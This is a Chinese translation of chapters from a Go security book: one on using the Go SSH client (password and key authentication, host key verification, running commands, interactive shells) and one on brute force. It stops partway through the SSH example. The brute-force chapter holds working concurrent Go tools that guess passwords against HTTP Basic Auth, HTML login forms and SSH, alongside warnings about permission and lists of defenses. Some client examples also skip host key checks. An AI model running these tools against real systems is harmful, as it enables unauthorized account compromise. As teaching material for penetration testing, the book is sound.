# Go 和安全（三）

> 原文：[`zh.annas-archive.org/md5/7656FC72AAECE258C02033B14E33EA12`](https://zh.annas-archive.org/md5/7656FC72AAECE258C02033B14E33EA12)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第七章：安全外壳（SSH）

**安全外壳**（**SSH**）是一种用于在不安全网络上通信的加密网络协议。 SSH 最常见的用途是连接到远程服务器并与 shell 进行交互。文件传输也通过 SSH 协议上的 SCP 和 SFTP 进行。 SSH 是为了取代明文协议 Telnet 而创建的。 随着时间的推移，已经有了许多 RFC 来定义 SSH。 以下是部分列表，以便让您了解定义的内容。 由于它是如此常见和关键的协议，值得花时间了解细节。 以下是一些 RFC：

+   *RFC 4250* ([`tools.ietf.org/html/rfc4250`](https://tools.ietf.org/html/rfc4250)): *安全外壳（SSH）协议分配的数字*

+   *RFC 4251* ([`tools.ietf.org/html/rfc4251`](https://tools.ietf.org/html/rfc4251)): *安全外壳（SSH）协议架构*

+   *RFC 4252* ([`tools.ietf.org/html/rfc4252`](https://tools.ietf.org/html/rfc4252)): *安全外壳（SSH）认证协议*

+   *RFC 4253* ([`tools.ietf.org/html/rfc4253`](https://tools.ietf.org/html/rfc4253)): *安全外壳（SSH）传输层协议*

+   *RFC 4254* ([`tools.ietf.org/html/rfc4254`](https://tools.ietf.org/html/rfc4254)): *安全外壳（SSH）连接协议*

+   *RFC 4255* ([`tools.ietf.org/html/rfc4255`](https://tools.ietf.org/html/rfc4255)): *使用 DNS 安全发布安全外壳（SSH）密钥指纹*

+   *RFC 4256* ([`tools.ietf.org/html/rfc4256`](https://tools.ietf.org/html/rfc4256)): *安全外壳协议（SSH）的通用消息交换认证*

+   *RFC 4335* ([`tools.ietf.org/html/rfc4335`](https://tools.ietf.org/html/rfc4335)): **安全外壳（SSH）会话通道中断扩展**

+   *RFC 4344* ([`tools.ietf.org/html/rfc4344`](https://tools.ietf.org/html/rfc4344)): *安全外壳（SSH）传输层加密模式*

+   *RFC 4345* ([`tools.ietf.org/html/rfc4345`](https://tools.ietf.org/html/rfc4345)): *安全外壳（SSH）传输层协议的改进 Arcfour 模式*

稍后还对标准进行了额外的扩展，您可以在[`en.wikipedia.org/wiki/Secure_Shell#Standards_documentation`](https://en.wikipedia.org/wiki/Secure_Shell#Standards_documentation)上阅读相关内容。

SSH 是互联网上常见的暴力破解和默认凭据攻击目标。 因此，您可能考虑将 SSH 放在非标准端口上，但保持在系统端口（小于 1024）上，以便低特权用户在服务关闭时无法潜在地劫持端口。 如果将 SSH 保留在默认端口上，则诸如`fail2ban`之类的服务对于限制速率和阻止暴力破解攻击至关重要。 理想情况下，应完全禁用密码身份验证，并要求密钥身份验证。

SSH 包并不随标准库一起打包，尽管它是由 Go 团队编写的。 它正式是 Go 项目的一部分，但在主 Go 源树之外，因此默认情况下不会随 Go 一起安装。 它可以从[`golang.org/`](https://golang.org/)获取，并且可以使用以下命令进行安装：

```go
go get golang.org/x/crypto/ssh
```

在本章中，我们将介绍如何使用 SSH 客户端进行连接，执行命令和使用交互式 shell。 我们还将介绍使用密码或私钥等不同的身份验证方法。 SSH 包提供了用于创建服务器的函数，但本书中我们只涵盖客户端。

本章将专门涵盖 SSH 的以下内容：

+   使用密码进行身份验证

+   使用私钥进行身份验证

+   验证远程主机的密钥

+   通过 SSH 执行命令

+   启动交互式 shell

# 使用 Go SSH 客户端

`golang.org/x/crypto/ssh`包提供了一个与 SSH 版本 2 兼容的 SSH 客户端，这是最新版本。该客户端将与 OpenSSH 服务器以及遵循 SSH 规范的任何其他服务器一起工作。它支持传统的客户端功能，如子进程、端口转发和隧道。

# 身份验证方法

身份验证不仅是第一步，也是最关键的一步。不正确的身份验证可能导致机密性、完整性和可用性的潜在损失。如果未验证远程服务器，可能会发生中间人攻击，导致窃听、操纵或阻止数据。弱密码身份验证可能会被暴力攻击利用。

这里提供了三个例子。第一个例子涵盖了密码认证，这是常见的，但由于密码的熵和位数与加密密钥相比较低，因此不建议使用。第二个例子演示了如何使用私钥对远程服务器进行身份验证。这两个例子都忽略了远程主机提供的公钥。这是不安全的，因为您可能最终连接到一个您不信任的远程主机，但对于测试来说已经足够了。身份验证的第三个例子是理想的流程。它使用密钥进行身份验证并验证远程服务器。

请注意，本章不使用 PEM 格式的密钥文件，而是使用 SSH 格式的密钥，这是处理 SSH 最常见的格式。这些例子与 OpenSSH 工具和密钥兼容，如`ssh`、`sshd`、`ssh-keygen`、`ssh-copy-id`和`ssh-keyscan`。

我建议您使用`ssh-keygen`生成用于身份验证的公钥和私钥对。这将以 SSH 密钥格式生成`id_rsa`和`id_rsa.pub`文件。`ssh-keygen`工具是 OpenSSH 项目的一部分，并且默认情况下已经打包到 Ubuntu 中：

```go
ssh-keygen
```

使用`ssh-copy-id`将您的公钥（`id_rsa.pub`）复制到远程服务器的`~/.ssh/authorized_keys`文件中，以便您可以使用私钥进行身份验证：

```go
ssh-copy-id yourserver.com
```

# 使用密码进行身份验证

通过 SSH 进行密码身份验证是最简单的方法。此示例演示了如何使用`ssh.ClientConfig`结构配置 SSH 客户端，然后使用`ssh.Dial()`连接到 SSH 服务器。客户端被配置为使用密码，通过指定`ssh.Password()`作为身份验证函数：

```go
package main

import (
   "golang.org/x/crypto/ssh"
   "log"
)

var username = "username"
var password = "password"
var host = "example.com:22"

func main() {
   config := &ssh.ClientConfig{
      User: username,
      Auth: []ssh.AuthMethod{
         ssh.Password(password),
      },
      HostKeyCallback: ssh.InsecureIgnoreHostKey(),
   }
   client, err := ssh.Dial("tcp", host, config)
   if err != nil {
      log.Fatal("Error dialing server. ", err)
   }

   log.Println(string(client.ClientVersion()))
} 
```

# 使用私钥进行身份验证

与密码相比，私钥具有一些优势。它比密码长得多，使得暴力破解变得更加困难。它还消除了输入密码的需要，使连接到远程服务器变得更加方便。无密码身份验证对于需要在没有人为干预的情况下自动运行的 cron 作业和其他服务也是有帮助的。一些服务器完全禁用密码身份验证并要求使用密钥。

在您可以使用私钥进行身份验证之前，远程服务器将需要您的公钥作为授权密钥。

如果您的系统上有`ssh-copy-id`工具，您可以使用它。它将把您的公钥复制到远程服务器，放置在您的家目录 SSH 目录（`~/.ssh/authorized_keys`）中，并设置正确的权限：

```go
ssh-copy-id example.com 
```

下面的例子与前面的例子类似，我们使用密码进行身份验证，但`ssh.ClientConfig`被配置为使用`ssh.PublicKeys()`作为身份验证函数，而不是`ssh.Password()`。我们还将创建一个名为`getKeySigner()`的特殊函数，以便从文件中加载客户端的私钥：

```go
package main

import (
   "golang.org/x/crypto/ssh"
   "io/ioutil"
   "log"
)

var username = "username"
var host = "example.com:22"
var privateKeyFile = "/home/user/.ssh/id_rsa"

func getKeySigner(privateKeyFile string) ssh.Signer {
   privateKeyData, err := ioutil.ReadFile(privateKeyFile)
   if err != nil {
      log.Fatal("Error loading private key file. ", err)
   }

   privateKey, err := ssh.ParsePrivateKey(privateKeyData)
   if err != nil {
      log.Fatal("Error parsing private key. ", err)
   }
   return privateKey
}

func main() {
   privateKey := getKeySigner(privateKeyFile)
   config := &ssh.ClientConfig{
      User: username,
      Auth: []ssh.AuthMethod{
         ssh.PublicKeys(privateKey), // Pass 1 or more key
      },
      HostKeyCallback: ssh.InsecureIgnoreHostKey(),
   }

   client, err := ssh.Dial("tcp", host, config)
   if err != nil {
      log.Fatal("Error dialing server. ", err)
   }

   log.Println(string(client.ClientVersion()))
} 
```

请注意，您可以将多个私钥传递给`ssh.PublicKeys()`函数。它接受无限数量的密钥。如果您提供多个密钥，但只有一个适用于服务器，它将自动使用适用的密钥。

如果您想使用相同的配置连接到多台服务器，这将非常有用。您可能希望使用 1,000 个唯一的私钥连接到 1,000 个不同的主机。您可以重用包含所有私钥的单个配置，而不必创建多个 SSH 客户端配置。

# 验证远程主机

要验证远程主机，在`ssh.ClientConfig`中，将`HostKeyCallback`设置为`ssh.FixedHostKey()`，并传递远程主机的公钥。如果您尝试连接到服务器并提供了不同的公钥，连接将被中止。这对于确保您连接到预期的服务器而不是恶意服务器非常重要。如果 DNS 受到损害，或者攻击者执行了成功的 ARP 欺骗，您的连接可能会被重定向或成为中间人攻击的受害者，但攻击者将无法模仿真实服务器而没有相应的服务器私钥。出于测试目的，您可以选择忽略远程主机提供的密钥。

这个例子是连接最安全的方式。它使用密钥进行身份验证，而不是密码，并验证远程服务器的公钥。

此方法将使用`ssh.ParseKnownHosts()`。这使用标准的`known_hosts`文件。`known_hosts`格式是 OpenSSH 的标准。该格式在*sshd(8)*手册页中有文档记录。

请注意，Go 的`ssh.ParseKnownHosts()`只会解析单个条目，因此您应该创建一个包含服务器单个条目的唯一文件，或者确保所需的条目位于文件顶部。

要获取远程服务器的公钥以进行验证，请使用`ssh-keyscan`。这将以`known_hosts`格式返回服务器密钥，将在以下示例中使用。请记住，Go 的`ssh.ParseKnownHosts`命令只读取`known_hosts`文件的第一个条目：

```go
ssh-keyscan yourserver.com
```

`ssh-keyscan`程序将返回多个密钥类型，除非使用`-t`标志指定密钥类型。确保选择具有所需密钥算法的密钥类型，并且`ssh.ClientConfig()`中列出的`HostKeyAlgorithm`与之匹配。此示例包括每个可能的`ssh.KeyAlgo*`选项。我建议您选择尽可能高强度的算法，并且只允许该选项：

```go
package main

import (
   "golang.org/x/crypto/ssh"
   "io/ioutil"
   "log"
)

var username = "username"
var host = "example.com:22"
var privateKeyFile = "/home/user/.ssh/id_rsa"

// Known hosts only reads FIRST entry
var knownHostsFile = "/home/user/.ssh/known_hosts"

func getKeySigner(privateKeyFile string) ssh.Signer {
   privateKeyData, err := ioutil.ReadFile(privateKeyFile)
   if err != nil {
      log.Fatal("Error loading private key file. ", err)
   }

   privateKey, err := ssh.ParsePrivateKey(privateKeyData)
   if err != nil {
      log.Fatal("Error parsing private key. ", err)
   }
   return privateKey
}

func loadServerPublicKey(knownHostsFile string) ssh.PublicKey {
   publicKeyData, err := ioutil.ReadFile(knownHostsFile)
   if err != nil {
      log.Fatal("Error loading server public key file. ", err)
   }

   _, _, publicKey, _, _, err := ssh.ParseKnownHosts(publicKeyData)
   if err != nil {
      log.Fatal("Error parsing server public key. ", err)
   }
   return publicKey
}

func main() {
   userPrivateKey := getKeySigner(privateKeyFile)
   serverPublicKey := loadServerPublicKey(knownHostsFile)

   config := &ssh.ClientConfig{
      User: username,
      Auth: []ssh.AuthMethod{
         ssh.PublicKeys(userPrivateKey),
      },
      HostKeyCallback: ssh.FixedHostKey(serverPublicKey),
      // Acceptable host key algorithms (Allow all)
      HostKeyAlgorithms: []string{
         ssh.KeyAlgoRSA,
         ssh.KeyAlgoDSA,
         ssh.KeyAlgoECDSA256,
         ssh.KeyAlgoECDSA384,
         ssh.KeyAlgoECDSA521,
         ssh.KeyAlgoED25519,
      },
   }

   client, err := ssh.Dial("tcp", host, config)
   if err != nil {
      log.Fatal("Error dialing server. ", err)
   }

   log.Println(string(client.ClientVersion()))
} 
```

请注意，除了`ssh.KeyAlgo*`常量之外，如果使用证书，还有`ssh.CertAlgo*`常量。

# 通过 SSH 执行命令

现在我们已经建立了多种身份验证和连接到远程 SSH 服务器的方式，我们需要让`ssh.Client`开始工作。到目前为止，我们只是打印出客户端版本。第一个目标是执行单个命令并查看输出。

一旦创建了`ssh.Client`，就可以开始创建会话。一个客户端可以同时支持多个会话。会话有自己的标准输入、输出和错误。它们是标准的读取器和写入器接口。

要执行命令，有几个选项：`Run()`、`Start()`、`Output()`和`CombinedOutput()`。它们都非常相似，但行为略有不同：

+   `session.Output(cmd)`: `Output()`函数将执行命令，并将`session.Stdout`作为字节片返回。

+   `session.CombinedOutput(cmd)`: 这与`Output()`相同，但它返回标准输出和标准错误的组合。

+   `session.Run(cmd)`: `Run()`函数将执行命令并等待其完成。它将填充标准输出和错误缓冲区，但不会对其进行任何操作。您必须手动读取缓冲区，或在调用`Run()`之前将会话输出设置为转到终端输出（例如，`session.Stdout = os.Stdout`）。只有在程序以错误代码`0`退出并且没有复制标准输出缓冲区时，它才会返回而不出现错误。

+   `session.Start(cmd)`: `Start()`函数类似于`Run()`，但它不会等待命令完成。如果要阻塞执行直到命令完成，必须显式调用`session.Wait()`。这对于启动长时间运行的命令或者对应用程序流程有更多控制的情况非常有用。

一个会话只能执行一个操作。一旦调用`Run()`、`Output()`、`CombinedOutput()`、`Start()`或`Shell()`，就不能再使用该会话执行任何其他命令。如果需要运行多个命令，可以用分号将它们串联在一起。例如，可以像这样在单个命令字符串中传递多个命令：

```go
df -h; ps aux; pwd; whoami;
```

否则，您可以为需要运行的每个命令创建一个新会话。一个会话等同于一个命令。

以下示例使用密钥认证连接到远程 SSH 服务器，然后使用`client.NewSession()`创建一个会话。然后将会话的标准输出连接到我们本地终端的标准输出，然后调用`session.Run()`，这将在远程服务器上执行命令：

```go
package main

import (
   "golang.org/x/crypto/ssh"
   "io/ioutil"
   "log"
   "os"
)

var username = "username"
var host = "example.com:22"
var privateKeyFile = "/home/user/.ssh/id_rsa"
var commandToExecute = "hostname"

func getKeySigner(privateKeyFile string) ssh.Signer {
   privateKeyData, err := ioutil.ReadFile(privateKeyFile)
   if err != nil {
      log.Fatal("Error loading private key file. ", err)
   }

   privateKey, err := ssh.ParsePrivateKey(privateKeyData)
   if err != nil {
      log.Fatal("Error parsing private key. ", err)
   }
   return privateKey
}

func main() {
   privateKey := getKeySigner(privateKeyFile)
   config := &ssh.ClientConfig{
      User: username,
      Auth: []ssh.AuthMethod{
         ssh.PublicKeys(privateKey),
      },
      HostKeyCallback: ssh.InsecureIgnoreHostKey(),
   }

   client, err := ssh.Dial("tcp", host, config)
   if err != nil {
      log.Fatal("Error dialing server. ", err)
   }

   // Multiple sessions per client are allowed
   session, err := client.NewSession()
   if err != nil {
      log.Fatal("Failed to create session: ", err)
   }
   defer session.Close()

   // Pipe the session output directly to standard output
   // Thanks to the convenience of writer interface
   session.Stdout = os.Stdout

   err = session.Run(commandToExecute)
   if err != nil {
      log.Fatal("Error executing command. ", err)
   }
} 
```

# 启动交互式 shell

在前面的例子中，我们演示了如何运行命令字符串。还有一个选项可以打开一个 shell。通过调用`session.Shell()`，可以执行一个交互式登录 shell，加载用户的默认 shell 和默认配置文件（例如`.profile`）。调用`session.RequestPty()`是可选的，但是当请求一个伪终端时，shell 的工作效果要好得多。您可以将终端名称设置为`xterm`、`vt100`、`linux`或其他自定义名称。如果由于输出颜色值而导致输出混乱的问题，可以尝试使用`vt100`，如果仍然不起作用，可以使用非标准的终端名称或您知道不支持颜色的终端名称。许多程序会在不识别终端名称时禁用颜色输出。一些程序在未知的终端类型下根本无法工作，比如`tmux`。

有关 Go 终端模式常量的更多信息，请访问[`godoc.org/golang.org/x/crypto/ssh#TerminalModes`](https://godoc.org/golang.org/x/crypto/ssh#TerminalModes)。终端模式标志是 POSIX 标准，并在*RFC 4254*，*终端模式的编码*（第 8 节）中定义，您可以在[`tools.ietf.org/html/rfc4254#section-8`](https://tools.ietf.org/html/rfc4254#section-8)找到。

以下示例使用密钥认证连接到 SSH 服务器，然后使用`client.NewSession()`创建一个新会话。与前面的例子不同，我们将使用`session.RequestPty()`来获取一个交互式 shell，远程会话的标准输入、输出和错误流都连接到本地终端，因此您可以像与任何其他 SSH 客户端（例如 PuTTY）一样实时交互：

```go
package main

import (
   "fmt"
   "golang.org/x/crypto/ssh"
   "io/ioutil"
   "log"
   "os"
)

func checkArgs() (string, string, string) {
   if len(os.Args) != 4 {
      printUsage()
      os.Exit(1)
   }
   return os.Args[1], os.Args[2], os.Args[3]
}

func printUsage() {
   fmt.Println(os.Args[0] + ` - Open an SSH shell

Usage:
  ` + os.Args[0] + ` <username> <host> <privateKeyFile>

Example:
  ` + os.Args[0] + ` nanodano devdungeon.com:22 ~/.ssh/id_rsa
`)
}

func getKeySigner(privateKeyFile string) ssh.Signer {
   privateKeyData, err := ioutil.ReadFile(privateKeyFile)
   if err != nil {
      log.Fatal("Error loading private key file. ", err)
   }

   privateKey, err := ssh.ParsePrivateKey(privateKeyData)
   if err != nil {
      log.Fatal("Error parsing private key. ", err)
   }
   return privateKey
}

func main() {
   username, host, privateKeyFile := checkArgs()

   privateKey := getKeySigner(privateKeyFile)
   config := &ssh.ClientConfig{
      User: username,
      Auth: []ssh.AuthMethod{
         ssh.PublicKeys(privateKey),
      },
      HostKeyCallback: ssh.InsecureIgnoreHostKey(),
   }

   client, err := ssh.Dial("tcp", host, config)
   if err != nil {
      log.Fatal("Error dialing server. ", err)
   }

   session, err := client.NewSession()
   if err != nil {
      log.Fatal("Failed to create session: ", err)
   }
   defer session.Close()

   // Pipe the standard buffers together
   session.Stdout = os.Stdout
   session.Stdin = os.Stdin
   session.Stderr = os.Stderr

   // Get psuedo-terminal
   err = session.RequestPty(
      "vt100", // or "linux", "xterm"
      40,      // Height
      80,      // Width
      // https://godoc.org/golang.org/x/crypto/ssh#TerminalModes
      // POSIX Terminal mode flags defined in RFC 4254 Section 8.
      // https://tools.ietf.org/html/rfc4254#section-8
      ssh.TerminalModes{
         ssh.ECHO: 0,
      })
   if err != nil {
      log.Fatal("Error requesting psuedo-terminal. ", err)
   }

   // Run shell until it is exited
   err = session.Shell()
   if err != nil {
      log.Fatal("Error executing command. ", err)
   }
   session.Wait()
} 
```

# 总结

阅读完本章后，您现在应该了解如何使用 Go SSH 客户端连接和使用密码或私钥进行身份验证。此外，您现在应该了解如何在远程服务器上执行命令或开始交互式会话。

您如何以编程方式应用 SSH 客户端？您能想到任何用例吗？您管理多个远程服务器吗？您能自动化任何任务吗？

SSH 包还包含用于创建 SSH 服务器的类型和函数，但我们在本书中没有涵盖它们。阅读有关创建 SSH 服务器的更多信息，请访问[`godoc.org/golang.org/x/crypto/ssh#NewServerConn`](https://godoc.org/golang.org/x/crypto/ssh#NewServerConn)，以及有关 SSH 包的更多信息，请访问[`godoc.org/golang.org/x/crypto/ssh`](https://godoc.org/golang.org/x/crypto/ssh)。

在下一章中，我们将讨论暴力攻击，即猜测密码，直到最终找到正确的密码为止。暴力破解是我们可以使用 SSH 客户端以及其他协议和应用程序进行的操作。继续阅读下一章，了解如何执行暴力攻击。


# 第八章：暴力破解

暴力破解攻击，也称为穷举密钥攻击，是指您尝试对输入的每种可能组合，直到最终获得正确的组合。最常见的例子是暴力破解密码。您可以尝试每种字符、字母和符号的组合，或者您可以使用字典列表作为密码的基础。您可以在线找到基于常见密码的字典和预构建的单词列表，或者您可以创建自己的列表。

有不同类型的暴力破解密码攻击。有在线攻击，例如反复尝试登录网站或数据库。由于网络延迟和带宽限制，在线攻击速度较慢。服务也可能在太多失败尝试后对帐户进行速率限制或锁定。另一方面，还有离线攻击。离线攻击的一个例子是当您在本地硬盘上有一个充满哈希密码的数据库转储，并且您可以无限制地进行暴力破解，除了物理硬件。严肃的密码破解者会构建配备了几张强大图形卡的计算机，用于破解，这样的计算机成本高达数万美元。

关于在线暴力破解攻击的一点需要注意的是，它们很容易被检测到，会产生大量流量，可能会给服务器带来沉重负载，甚至完全使其崩溃，并且未经许可是非法的。在线服务方面的许可可能会让人产生误解。例如，仅因为您在 Facebook 等服务上拥有帐户，并不意味着您有权对自己的帐户进行暴力破解攻击。Facebook 仍然拥有服务器，即使只针对您的帐户，您也没有权限攻击他们的网站。即使您在 Amazon 服务器上运行自己的服务，例如 SSH 服务，您仍然没有权限进行暴力破解攻击。您必须请求并获得对 Amazon 资源进行渗透测试的特殊许可。您可以使用自己的虚拟机进行本地测试。

网络漫画*xkcd*有一部漫画与暴力破解密码的主题完美相关：

![](https://github.com/OpenDocCN/freelearn-golang-zh/raw/master/docs/sec-go/img/17987bbd-217b-435f-b4eb-bb536d16c4de.png)

来源：https://xkcd.com/936/

大多数，如果不是所有这些攻击，都可以使用以下一种或多种技术进行保护：

+   强密码（最好是口令或密钥）

+   实施失败尝试的速率限制/临时锁定

+   使用 CAPTCHA

+   添加双因素认证

+   加盐密码

+   限制对服务器的访问

本章将涵盖几个暴力破解的例子，包括以下内容：

+   HTTP 基本认证

+   HTML 登录表单

+   SSH 密码认证

+   数据库

# 暴力破解 HTTP 基本认证

HTTP 基本认证是指您在 HTTP 请求中提供用户名和密码。您可以在现代浏览器中将其作为 URL 的一部分传递。考虑以下示例：

```go
http://username:password@www.example.com
```

在编程时添加基本认证时，凭据以名为`Authorization`的 HTTP 标头提供，其中包含以 base64 编码并以`Basic`为前缀，用空格分隔的`username:password`值。考虑以下示例：

```go
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

Web 服务器在认证失败时通常会响应`401 Access Denied`代码，并且应该以`200 OK`等`2xx`成功代码进行响应。

此示例将获取一个 URL 和一个`username`值，并尝试使用生成的密码进行登录。

为了减少此类攻击的效果，可以在一定数量的登录尝试失败后实施速率限制功能或帐户锁定功能。

如果您需要从头开始构建自己的密码列表，请尝试从维基百科中记录的最常见密码开始[`en.wikipedia.org/wiki/List_of_the_most_common_passwords`](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)。以下是一个可以保存为`passwords.txt`的简短示例：

```go
password
123456
qwerty
abc123
iloveyou
admin
passw0rd
```

将前面代码块中的列表保存为一个文本文件，每行一个密码。名称不重要，因为你会将密码列表文件名作为命令行参数提供：

```go
package main 

import ( 
   "bufio" 
   "fmt" 
   "log" 
   "net/http" 
   "os" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force HTTP Basic Auth 

Passwords should be separated by newlines. 
URL should include protocol prefix. 

Usage: 
  ` + os.Args[0] + ` <username> <pwlistfile> <url> 

Example: 
  ` + os.Args[0] + ` admin passwords.txt https://www.test.com 
`) 
} 

func checkArgs() (string, string, string) { 
   if len(os.Args) != 4 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Username, Password list filename, URL 
   return os.Args[1], os.Args[2], os.Args[3] 
} 

func testBasicAuth(url, username, password string, doneChannel chan bool) { 
   client := &http.Client{} 
   request, err := http.NewRequest("GET", url, nil) 
   request.SetBasicAuth(username, password) 

   response, err := client.Do(request) 
   if err != nil { 
      log.Fatal(err) 
   } 
   if response.StatusCode == 200 { 
      log.Printf("Success!\nUser: %s\nPassword: %s\n", username,   
         password) 
      os.Exit(0) 
    } 
    doneChannel <- true 
} 

func main() { 
   username, pwListFilename, url := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwListFilename) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 2 

   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 

      password := scanner.Text() 
      go testBasicAuth(url, username, password, doneChannel) 

      // If max threads reached, wait for one to finish before continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# 暴力破解 HTML 登录表单

几乎每个具有用户系统的网站都在网页上提供登录表单。我们可以编写一个程序来重复提交登录表单。这个例子假设在 Web 应用程序上没有 CAPTCHA、速率限制或其他阻止机制。请记住不要对任何生产站点或您不拥有或没有权限的站点执行此攻击。如果您想测试它，我建议您设置一个本地 Web 服务器并仅在本地测试。

每个网络表单都可以使用不同的名称创建`用户名`和`密码`字段，因此这些字段的名称需要在每次运行时提供，并且必须特定于目标 URL。

查看源代码或检查目标表单，以获取输入元素的`name`属性以及`form`元素的目标`action`属性。如果`form`元素中没有提供操作 URL，则默认为当前 URL。另一个重要的信息是表单上使用的方法。登录表单应该是`POST`，但有可能编码不好，使用了`GET`方法。有些登录表单使用 JavaScript 提交表单，可能完全绕过标准的表单方法。使用这种逻辑的站点需要更多的逆向工程来确定最终的提交目的地和数据格式。您可以使用 HTML 代理或在浏览器中使用网络检查器查看 XHR 请求。

后面的章节将讨论 Web 爬取和在`DOM`接口中查询特定元素的方法，但本章不会讨论尝试自动检测表单字段并识别正确的输入元素。这一步必须在这里手动完成，但一旦识别出来，暴力攻击就可以自行运行。

为了防止这样的攻击，实施一个 CAPTCHA 系统或速率限制功能。

请注意，每个 Web 应用程序都可以有自己的身份验证方式。这不是一刀切的解决方案。它提供了一个基本的`HTTP POST`表单登录示例，但需要针对不同的应用程序进行轻微修改。

```go
package main 

import ( 
   "bufio" 
   "bytes" 
   "fmt" 
   "log" 
   "net/http" 
   "os" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force HTTP Login Form 

Passwords should be separated by newlines. 
URL should include protocol prefix. 
You must identify the form's post URL and username and password   
field names and pass them as arguments. 

Usage: 
  ` + os.Args[0] + ` <pwlistfile> <login_post_url> ` + 
      `<username> <username_field> <password_field> 

Example: 
  ` + os.Args[0] + ` passwords.txt` +
      ` https://test.com/login admin username password 
`) 
} 

func checkArgs() (string, string, string, string, string) { 
   if len(os.Args) != 6 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Password list, Post URL, username, username field, 
   // password field 
   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] 
} 

func testLoginForm( 
   url, 
   userField, 
   passField, 
   username, 
   password string, 
   doneChannel chan bool, 
) 
{ 
   postData := userField + "=" + username + "&" + passField + 
      "=" + password 
   request, err := http.NewRequest( 
      "POST", 
      url, 
      bytes.NewBufferString(postData), 
   ) 
   client := &http.Client{} 
   response, err := client.Do(request) 
   if err != nil { 
      log.Println("Error making request. ", err) 
   } 
   defer response.Body.Close() 

   body := make([]byte, 5000) // ~5k buffer for page contents 
   response.Body.Read(body) 
   if bytes.Contains(body, []byte("ERROR")) { 
      log.Println("Error found on website.") 
   } 
   log.Printf("%s", body) 

   if bytes.Contains(body,[]byte("ERROR")) || response.StatusCode != 200 { 
      // Error on page or in response code 
   } else { 
      log.Println("Possible success with password: ", password) 
      // os.Exit(0) // Exit on success? 
   } 

   doneChannel <- true 
} 

func main() { 
   pwList, postUrl, username, userField, passField := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwList) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 32 

   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 

      password := scanner.Text() 
      go testLoginForm( 
         postUrl, 
         userField, 
         passField, 
         username, 
         password, 
         doneChannel, 
      ) 

      // If max threads reached, wait for one to finish before  
      //continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# 暴力破解 SSH

安全外壳或 SSH 支持几种身份验证机制。如果服务器只支持公钥身份验证，那么暴力破解几乎是徒劳的。这个例子只会讨论 SSH 的密码身份验证。

为了防止这样的攻击，实施速率限制或使用类似 fail2ban 的工具，在检测到一定数量的登录失败尝试时，锁定帐户一段时间。还要禁用 root 远程登录。有些人喜欢将 SSH 放在非标准端口上，但最终放在高端口号的非受限端口上，比如`2222`，这不是一个好主意。如果您使用高端口号的非特权端口，另一个低特权用户可能会劫持该端口，并在其位置上启动自己的服务。如果要更改端口，将 SSH 守护程序放在低于`1024`的端口上。

这种攻击显然在日志中很吵闹，容易被检测到，并且被 fail2ban 等工具阻止。但如果您正在进行渗透测试，检查速率限制或帐户锁定是否存在可以作为一种快速方法。如果没有配置速率限制或临时帐户锁定，暴力破解和 DDoS 是潜在的风险。

运行此程序需要从[golang.org](http://www.golang.org)获取一个 SSH 包。您可以使用以下命令获取它：

```go
go get golang.org/x/crypto/ssh
```

安装所需的`ssh`包后，可以运行以下示例：

```go
package main 

import ( 
   "bufio" 
   "fmt" 
   "log" 
   "os" 

   "golang.org/x/crypto/ssh" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force SSH Password 

Passwords should be separated by newlines. 
URL should include hostname or ip with port number separated by colon 

Usage: 
  ` + os.Args[0] + ` <username> <pwlistfile> <url:port> 

Example: 
  ` + os.Args[0] + ` root passwords.txt example.com:22 
`) 
} 

func checkArgs() (string, string, string) { 
   if len(os.Args) != 4 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Username, Password list filename, URL 
   return os.Args[1], os.Args[2], os.Args[3] 
} 

func testSSHAuth(url, username, password string, doneChannel chan bool) { 
   sshConfig := &ssh.ClientConfig{ 
      User: username, 
      Auth: []ssh.AuthMethod{ 
         ssh.Password(password), 
      }, 
      // Do not check server key 
      HostKeyCallback: ssh.InsecureIgnoreHostKey(), 

      // Or, set the expected ssh.PublicKey from remote host 
      //HostKeyCallback: ssh.FixedHostKey(pubkey), 
   } 

   _, err := ssh.Dial("tcp", url, sshConfig) 
   if err != nil { 
      // Print out the error so we can see if it is just a failed   
      // auth or if it is a connection/name resolution problem. 
      log.Println(err) 
   } else { // Success 
      log.Printf("Success!\nUser: %s\nPassword: %s\n", username,   
      password) 
      os.Exit(0) 
   } 

   doneChannel <- true // Signal another thread spot has opened up 
} 

func main() { 

   username, pwListFilename, url := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwListFilename) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 2 

   // Check each password against url 
   for scanner.Scan() { 
